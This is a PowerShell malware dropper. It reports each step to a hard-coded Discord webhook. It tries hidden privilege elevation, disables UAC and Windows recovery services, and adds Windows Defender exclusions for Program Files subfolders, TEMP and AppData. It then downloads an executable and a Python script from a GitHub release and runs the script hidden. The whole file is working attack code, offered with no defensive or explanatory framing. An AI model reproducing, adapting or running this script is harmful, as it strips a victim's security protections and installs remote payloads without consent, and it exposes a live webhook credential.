$webhookUrl = 'https://discord.com/api/webhooks/1411023027860410490/tX-RGpPD7WxrwbTmOcDaU8BZG-2-FDfJsvMi9DXF2Dc57h1WJQMVReBZ-RF2AnmPV095'

# Function to send message to webhook
function Send-WebhookMessage {
    param($Message)
    $body = @{ content = $Message } | ConvertTo-Json
    try {
        Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $body -ContentType 'application/json' -ErrorAction Stop | Out-Null
    } catch {
        # Silent fail for webhook errors
    }
}

Send-WebhookMessage -Message "Script started"

try {
    # Check for admin privileges
    $isAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
    Send-WebhookMessage -Message "Admin check: $isAdmin"

    # Attempt silent elevation if not admin
    if (-not $isAdmin) {
        try {
            Send-WebhookMessage -Message "Attempting elevation"
            Start-Process powershell -Verb RunAs -ArgumentList "-NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$PSCommandPath`"" -WindowStyle Hidden -ErrorAction Stop
            Send-WebhookMessage -Message "Elevation successful"
            exit
        } catch {
            Send-WebhookMessage -Message "Elevation failed: $_"
        }
    }

    # Disable UAC and recovery services if admin
    if ($isAdmin) {
        try {
            Send-WebhookMessage -Message "Disabling UAC and recovery services"
            Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name "EnableLUA" -Value 0 -ErrorAction Stop | Out-Null
            & reagentc /disable | Out-Null
            Stop-Service -Name "Wecsvc" -Force -ErrorAction Stop | Out-Null
            Set-Service -Name "Wecsvc" -StartupType Disabled -ErrorAction Stop | Out-Null
            Stop-Service -Name "WinREAgent" -Force -ErrorAction Stop | Out-Null
            Set-Service -Name "WinREAgent" -StartupType Disabled -ErrorAction Stop | Out-Null
            Send-WebhookMessage -Message "UAC and recovery services disabled"
        } catch {
            Send-WebhookMessage -Message "Error disabling UAC/services: $_"
        }
    }

    # Define paths for exclusions
    $programFiles = "C:\Program Files"
    $tempFolder = $env:TEMP
    $appDataFolder = $env:APPDATA
    $localAppDataFolder = $env:LOCALAPPDATA

    # Get directories in C:\Program Files (excluding Windows* folders)
    $directories = Get-ChildItem -Path $programFiles -Directory | Where-Object { $_.Name -notlike "Windows*" }

    # Add Windows Defender exclusions
    $exclusionsAdded = $true
    foreach ($dir in $directories) {
        try {
            Add-MpPreference -ExclusionPath $dir.FullName -ErrorAction Stop | Out-Null
            Send-WebhookMessage -Message "Added exclusion: $($dir.FullName)"
        } catch {
            $exclusionsAdded = $false
            Send-WebhookMessage -Message "Error adding exclusion for $($dir.FullName): $_"
        }
    }

    try {
        Add-MpPreference -ExclusionPath $tempFolder -ErrorAction Stop | Out-Null
        Send-WebhookMessage -Message "Added exclusion: $tempFolder"
    } catch {
        $exclusionsAdded = $false
        Send-WebhookMessage -Message "Error adding exclusion for $tempFolder: $_"
    }

    try {
        Add-MpPreference -ExclusionPath $appDataFolder -ErrorAction Stop | Out-Null
        Send-WebhookMessage -Message "Added exclusion: $appDataFolder"
    } catch {
        $exclusionsAdded = $false
        Send-WebhookMessage -Message "Error adding exclusion for $appDataFolder: $_"
    }

    try {
        Add-MpPreference -ExclusionPath $localAppDataFolder -ErrorAction Stop | Out-Null
        Send-WebhookMessage -Message "Added exclusion: $localAppDataFolder"
    } catch {
        $exclusionsAdded = $false
        Send-WebhookMessage -Message "Error adding exclusion for $localAppDataFolder: $_"
    }

    # Download and save scripthelper.exe if exclusions were added
    if ($exclusionsAdded -and $directories) {
        $randomDir = $directories | Get-Random
        $destinationPath = Join-Path -Path $randomDir.FullName -ChildPath "scripthelper.exe"
        try {
            Add-MpPreference -ExclusionPath $randomDir.FullName -ErrorAction Stop | Out-Null
            Send-WebhookMessage -Message "Added exclusion for download path: $randomDir"
        } catch {
            Send-WebhookMessage -Message "Error adding exclusion for $randomDir: $_"
        }

        $downloadUrl = "https://github.com/skiddyskid111/resources/releases/download/adadad/scripthelper.exe"
        try {
            Invoke-WebRequest -Uri $downloadUrl -OutFile $destinationPath -UseBasicParsing -ErrorAction Stop | Out-Null
            Send-WebhookMessage -Message "Downloaded scripthelper.exe to $destinationPath"
        } catch {
            Send-WebhookMessage -Message "Error downloading scripthelper.exe: $_"
        }
    }

    # Attempt to run 1.pyw in memory
    $pythonUrl = "https://github.com/skiddyskid111/resources/releases/download/adadad/1.pyw"
    try {
        $pythonCode = (Invoke-WebRequest -Uri $pythonUrl -UseBasicParsing -ErrorAction Stop).Content
        Send-WebhookMessage -Message "Downloaded Python script"
        try {
            Start-Process pythonw.exe -ArgumentList "-c", $pythonCode -WindowStyle Hidden -ErrorAction Stop | Out-Null
            Send-WebhookMessage -Message "Executed Python script with pythonw.exe"
        } catch {
            Send-WebhookMessage -Message "Error executing with pythonw.exe: $_"
            try {
                Start-Process python.exe -ArgumentList "-c", $pythonCode -WindowStyle Hidden -ErrorAction Stop | Out-Null
                Send-WebhookMessage -Message "Executed Python script with python.exe"
            } catch {
                Send-WebhookMessage -Message "Error executing with python.exe: $_"
            }
        }
    } catch {
        Send-WebhookMessage -Message "Error downloading Python script: $_"
    }

    Send-WebhookMessage -Message "Script completed"
} catch {
    Send-WebhookMessage -Message "Unexpected error: $_"
}
